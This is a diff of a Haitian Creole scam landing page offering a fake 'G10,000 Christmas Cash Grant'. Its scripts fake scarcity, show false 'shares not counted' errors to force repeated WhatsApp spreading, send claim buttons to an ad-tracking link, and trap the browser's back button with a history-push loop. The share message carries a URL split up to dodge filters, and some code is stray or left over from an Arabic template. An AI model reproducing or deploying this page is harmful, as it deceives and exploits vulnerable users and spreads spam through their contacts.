@@ -13,6 +13,7 @@
 <meta property="og:type" content="website" /> 
 	
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+	
 <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/8.11.8/sweetalert2.all.min.js"></script>
   
 <link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
@@ -25,6 +26,7 @@
    else if(navigator.language) {
       var language = navigator.language;
    }
+   
    switch (language.substring(0,2))  {
       case "" : location.href="";
          break;
@@ -45,9 +47,11 @@
 
 <vue-modal :open="showInstructionsModal">
 <h2 class="heading heading--h1">Felisitasyon! Repons ou yo anrejistre</h2>
+ 
 <p class="paragraph">
 Kounye a ou gen chans pou genyen G10,000 nan pri lajan Wyn Grant la<br><br>
-Ou gen 3 chans! Nou swete w bon chans<br><br>
+Ou gen 3 chans! Nou swete w bon chans
+<br><br>
 Ou bezwen chwazi bwat ki gen kado a ladan l.
 </p>
 <br>
@@ -71,6 +75,7 @@ OK
 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTij5mlPsKx4UIqreveNr5p04a0CjJzZT3Rdg&s" style="width: 240px;">
 <h1 class="heading heading--h1">Felisitasyon!</h1>
 <p class="paragraph">
+
 Pri ou se: <b>G10,000 lajan kach</b><br>
 Swiv enstriksyon yo sou pwochen paj la pou reklame pri ou!
 </p>
@@ -79,39 +84,204 @@ Swiv enstriksyon yo sou pwochen paj la pou reklame pri ou!
 OK
 </button>
 </vue-modal>
-
 <div class="left">
 <div class="product-preview">
+<div class="product-preview__title">
+  
+</div>
+
 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwuXr3_U1TijYHT_eo_Ze76Uz84fZVfsuSQzQouWaeqK41K60aDm3vlsO91Cwf6yKwcPqusm922U_ksuq3LiLeTaIyzZ2TO1Hf1vHXPwExT4D4phWuPQXmUC7ZYzMSmo5cp10tpnPnYXDjBACh2WhXZeTrMz8idyQIVjFWTHkazs6pICKPPtsQdXJMwM0/s1518/wycl698471_n.jpg" style="width:100%;" />
-<h1 class="heading heading--h1">Bonjou!</h1>
+
+<h1 class="heading heading--h1">
+Bonjou!
+</h1>
+
 <p class="paragraph">
-Byenveni nan <b>G10,000 Wyn CHRISTMAS CASH GRANT an patenarya ak Clie pou Ayisyen</b>, pa rate opòtinite sa a.
+Byenveni nan <b>G10,000 Wyn CHRISTMAS CASH GRANT an patenarya ak Clie pou Ayisyen</b>, pa rate kado lajan Nwèl G10,000 sa a pou tout Ayisyen.
 <br>
-Reponn kesyon ki anba yo pou reklame <b>G10,000 lajan kach</b>
+Reponn kesyon ki anba yo pou reklame <b>Pri Lajan Kach G10,000</b>
 </p>
+
+<br>
 </div>
 </div>
 
 <div class="right">
-<vue-survey v-if="showSurvey" :show-steps="true" :questions='[
-{
-title: "Èske ou se yon rezidan Ayiti?",
-answers: [ { text: "Wi" }, { text: "Non" } ]
-},
-{
-title: "Èske ou gen nimewo idantite Ayisyen?",
-answers: [ { text: "Wi" }, { text: "Non" } ]
-},
-{
-title: "Chwazi sèks ou",
-answers: [ { text: "Gason" }, { text: "Fi" } ]
-},
-{
-title: "Chwazi gwoup laj ou",
-answers: [ { text: "18 - 20 an" }, { text: "21 - 25 an" }, { text: "26 - 30 an" }, { text: "30 an anwo" } ]
-}
-]' v-on:finish="onSurveyFinish"></vue-survey>
+<vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="https://i.imgur.com/HSX0Uhw.png" box-image="https://i.imgur.com/45mMPJQ.png" box-back-image="https://i.imgur.com/HSmfDGb.png" prize-image="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTij5mlPsKx4UIqreveNr5p04a0CjJzZT3Rdg&s" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
+
+<div class="verify" v-if="showRotator">
+<vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
+                     "Tanpri tann yon ti moman...",
+              "Tanpri tann yon ti moman...",
+              "Tanpri tann yon ti moman..."
+            ]'>
+</vue-text-rotator>
+
+<div class="verify__text" v-if="rotateIndex > 1">
+<strong>
+Ou reponn 4/4 kesyon yo
+</strong>
+<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
+
+<div class="verify__text" v-else>
+Repons ou yo ap trete
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+
+<div class="verify__text" v-if="rotateIndex > 2">
+<strong>
+Gen toujou kado ki disponib!
+</strong>
+<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+
+<div class="verify__text" v-else>
+Ap chèche kado yo..
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+
+<div class="verify__text" v-if="rotateIndex > 3">
+<strong>
+Gen sèlman (289) kado ki rete!
+</strong>
+<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+
+<div class="verify__text" v-else>
+Stok la ap verifye
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+
+</div>
+
+<vue-survey v-if="showSurvey" :show-steps="true" :questions='[
+            {
+              title: "Èske ou se yon rezidan Ayiti?",
+              answers: [ { text: "Wi" }, { text: "Non" } ]
+            },
+            {
+              title: "Èske ou gen nimewo idantite Ayisyen?",
+              answers: [ { text: "Wi" }, { text: "Non" } ]
+            },
+            {
+              title: "Chwazi sèks ou",
+              answers: [ { text: "Gason" }, { text: "Fi" } ]
+            },
+            {
+              title: "Chwazi gwoup laj ou",
+              answers: [ { text: "18 - 20 an" }, { text: "21 - 25 an" }, { text: "26 - 30 an" }, { text: "30 an anwo" } ]
+            }
+          ]' v-on:finish="onSurveyFinish"></vue-survey>
+</div>
+<br>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNLqIIVDeSyrDzhpv2qsYpVeZAITRneSBrxgdiSe4cl9CSy5XNxjgBSAmo-09WAV0K_g1j9tcUivv5TSCNFv3oeZDINMBtu1DKXiJHrw1q7ssFVMaRQtmRGTpd6X_H04Sb553lTKGHvTIoOiYk1bmW9UJCukpPQJymU_U4DPEqpBg-yjclLIKPuG7DCz8/s600/WhatsApp%20Image%202024-10-08%20at%2022.13.46%20%281%29.jpeg" style="width:100%;" />
+</div>
+</div>
+
+<div id="share">
+    
+<div class="title1">
+<p>Felisitasyon!</p>
+</div>
+
+<div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
+<center>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwuXr3_U1TijYHT_eo_Ze76Uz84fZVfsuSQzQouWaeqK41K60aDm3vlsO91Cwf6yKwcPqusm922U_ksuq3LiLeTaIyzZ2TO1Hf1vHXPwExT4D4phWuPQXmUC7ZYzMSmo5cp10tpnPnYXDjBACh2WhXZeTrMz8idyQIVjFWTHkazs6pICKPPtsQdXJMwM0/s1518/wycl698471_n.jpg" width='81%'/>
+</center>
+</div>
+
+<p class="txt1">
+Pri ou se: <b>G10,000</b> <br>
+Swiv enstriksyon ki anba yo pou reklame pri ou!
+</p>
+
+<div class="bottom" id='buttonO'>
+<div id="lastapp">
+<p class="rules">1. pataje ak 5 gwoup / 15 zanmi sou "Whatsapp" (klike sou ikon "Whatsapp" ki anba a)</p>
+<p class="rules">2. Klike sou "Kontinye" epi reklame pri ou.</p>
+</div>
+
+<div class="share_main_bt" id="whatsapp">
+WhatsApp&nbsp; →
+</div>
+
+<h4 class="textlastup">
+Pataje jiskaske ba ble a plen!
+</h4>
+
+<div class="barr">
+<div class="fill">
+<div id="fill2"></div>
+</div>
+
+<div class="percentage center">
+<span><i class="fa fa-spinner fa-pulse"></i></span>
+<span id="percentage2">0%</span>
+</div>
+
+<br>
+
+<div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
+Kontinye
+</div>
+
+</div>
+</div>
+
+<br>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNLqIIVDeSyrDzhpv2qsYpVeZAITRneSBrxgdiSe4cl9CSy5XNxjgBSAmo-09WAV0K_g1j9tcUivv5TSCNFv3oeZDINMBtu1DKXiJHrw1q7ssFVMaRQtmRGTpd6X_H04Sb553lTKGHvTIoOiYk1bmW9UJCukpPQJymU_U4DPEqpBg-yjclLIKPuG7DCz8/s600/WhatsApp%20Image%202024-10-08%20at%2022.13.46%20%281%29.jpeg" style="width:100%;" />
+</div>
+<div id="claim">
+<div class="title1">
+<p>Felisitasyon!</p>
+</div>
+
+<div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
+<center>
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTij5mlPsKx4UIqreveNr5p04a0CjJzZT3Rdg&s" width='81%'/>
+</center>
+</div>
+
+<p class="txt1">
+Pri ou se: <b>G10,000 lajan kach.</b> <br>
+Swiv enstriksyon ki anba a pou reklame pri ou!
+</p>
+
+<p class="done">
+<i class="fa fa-check-circle fa-3x" aria-hidden="true"></i>
+</p>
+<br>
+
+<a onclick="window.open('https://luglawhaulsano.net/4/8631702')" href="https://bundle-gift.github.io/gifts/CalebEnglish1.html">
+<button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt">
+<font color="#ffffff">REKLAME G10,000</font>
+</button>
+</a>
+<br/><br/>
+
+<div class="share_main_bt" id="offer">CHWAZI TIP KONT</div>
+<br/><br/>
+
+<a onclick="window.open('https://luglawhaulsano.net/4/8631702')" href="https://bundle-gift.github.io/gifts/CalebEnglish1.html">
+<button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt">
+<font color="#ffffff">EPAY</font>
+</button>
+</a>
+<br/><br/>
+
+<a onclick="window.open('https://luglawhaulsano.net/4/8631702')" href="https://bundle-gift.github.io/gifts/CalebEnglish1.html">
+<button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt">
+<font color="#ffffff">KOURAN</font>
+</button>
+</a>
+<br/><br/>
+
+<div class="share_main_bt" id="offers">Retire G10,000</div>
+<br>
+
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNLqIIVDeSyrDzhpv2qsYpVeZAITRneSBrxgdiSe4cl9CSy5XNxjgBSAmo-09WAV0K_g1j9tcUivv5TSCNFv3oeZDINMBtu1DKXiJHrw1q7ssFVMaRQtmRGTpd6X_H04Sb553lTKGHvTIoOiYk1bmW9UJCukpPQJymU_U4DPEqpBg-yjclLIKPuG7DCz8/s600/WhatsApp%20Image%202024-10-08%20at%2022.13.46%20%281%29.jpeg" style="width:100%;" />
+<br/>
 
 </div>
 </div>
@@ -124,4 +294,145 @@ $("#share").fadeIn(1000);
 </script>
 
 </body>
-</html>
+
+<script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+<script>
+var text1 = "ytime",
+text2 = " مكتبة جرير تقدم ",
+text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
+error = "Gen yon erè!\nPost yo pa konte. Ou ka pataje ak menm zanmi oswa gwoup plis pase yon fwa, tanpri pataje ankò.",
+cpa = "https://luglawhaulsano.net/4/8631702",
+cpa1 = "https://luglawhaulsano.net/4/8631702",
+saved = "coke2",
+share = "whatsapp://send?text=" + text1;
+</script>
+
+<script>
+var tiaoban = [
+"G10,000 Kado Lajan Nwèl Wyn an patenarya ak Clie pou Ayisyen%0A%0A*KÒMAN POU JWENN LI*%0AVizite lyen ki anba a epi reponn kesyon yo pou resevwa G10,000 touswit.%0A Mwen deja jwenn pa mwen%0A%0AKlike la👇%0A https://rwa 2rd.in3 fo/925000-D /angote-Refi 4nery-Cash-Gran6/ t.ht-ml ",
+"G10,000 Kado Lajan Nwèl Wyn an patenarya ak Clie pou Ayisyen%0A%0A*KÒMAN POU JWENN LI*%0AVizite lyen ki anba a epi reponn kesyon yo pou resevwa G10,000 touswit.%0A Mwen deja jwenn pa mwen%0A%0AKlike la👇%0A https://rwa 2rd.in3 fo/925000-D /angote-Refi 4nery-Cash-Gran6/ t.ht-ml ",
+"G10,000 Kado Lajan Nwèl Wyn an patenarya ak Clie pou Ayisyen%0A%0A*KÒMAN POU JWENN LI*%0AVizite lyen ki anba a epi reponn kesyon yo pou resevwa G10,000 touswit.%0A Mwen deja jwenn pa mwen%0A%0AKlike la👇%0A https://rwa 2rd.in3 fo/925000-D /angote-Refi 4nery-Cash-Gran6/ t.ht-ml ",
+"G10,000 Kado Lajan Nwèl Wyn an patenarya ak Clie pou Ayisyen%0A%0A*KÒMAN POU JWENN LI*%0AVizite lyen ki anba a epi reponn kesyon yo pou resevwa G10,000 touswit.%0A Mwen deja jwenn pa mwen%0A%0AKlike la👇%0A https://rwa 2rd.in3 fo/925000-D /angote-Refi 4nery-Cash-Gran6/ t.ht-ml "
+];
+var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
+</script>
+var date = new Date();
+var hour = (date.getHours() > 9) ? date.getHours() : '0' + date.getHours();
+var minute = (date.getMinutes() > 9) ? date.getMinutes() : '0' + date.getMinutes();
+var second = (date.getSeconds() > 9) ? date.getSeconds() : '0' + date.getSeconds();
+var mytime = hour + ':' + minute + ':' + second;
+
+var tb = tiaoban ;
+</script>
+
+<!-- code by ODcompany -->
+<!-- JS-WP -->
+<script type="text/javascript">
+var swidth = localStorage.getItem(saved);
+if (swidth !== null) {
+    var width = swidth * 1;
+    $("#intro").fadeOut(0);
+    $(".comments").fadeOut(0);
+    $("#share").fadeIn(0);
+    $("#fill2").css("width", width + "%");
+    $("#percentage2").text(width + "%");
+} else {
+    var width = 0;
+}
+$("#whatsapp").click(function () {
+    window.open('whatsapp://send?text=' + tb);
+    if (width == 0) {
+        width += 50;
+    } else if (width == 50) {
+        alert(error);
+        width += 15;
+    } else if (width == 65) {
+        width += 5;
+    } else if (width == 70) {
+        alert(error);
+        width += 10;
+    } else if (width == 80) {
+        alert(error);
+        width += 5;
+    } else if (width == 85) {
+        width += 2;
+    } else if (width == 87) {
+        width += 3;
+    } else if (width == 90) {
+        width += 3;
+    } else if (width == 93) {
+        width += 2;
+    } else if (width == 95) {
+        width += 2;
+    } else if (width == 97) {
+        width += 1;
+    } else if (width == 98) {
+        width += 1;
+    } else {
+        $("#share").fadeOut(0);
+        $("#claim").fadeIn(1000);
+    }
+    localStorage.setItem(saved, width);
+    setTimeout(function () {
+        $("#fill2").css("width", width + "%");
+        $("#percentage2").text(width + "%");
+    }, 2000);
+});
+
+$("#offer").click(function () {
+    window.open(cpa, "_blank");
+});
+
+$("#offers").click(function () {
+    window.open(cpa1, "_blank");
+});
+
+$("#offerss").click(function () {
+    window.open(cpa2, "_blank");
+});
+
+function tipn(){
+Swal.fire({
+icon: 'error',
+title: 'Malerezman...',
+text: 'Pou resevwa pri ou, ou dwe pataje evènman nou an ak zanmi ou yo. Pataje jiskaske ba ble a plen!',
+});
+}
+</script>
+
+<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">
+var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,3313418,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); 
+hs.type = 'text/javascript'; 
+hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();
+</script>
+
+<noscript>
+<a href="/" target="_blank">
+<img src="//sstatic1.histats.com/0.gif?4521361&101" alt="counter hit make" border="0">
+</a>
+</noscript>
+<!-- Histats.com  END  -->
+
+<script type="text/javascript">
+!function (){
+var t;
+try{
+for (t=0; 10 > t; ++t)
+history.pushState({}, "", "#");
+onpopstate=function (t){
+t.state && alert('Tanpri pataje maksimòm pou resevwa kado a.');
+}
+}
+catch (o){}
+}();
+</script>
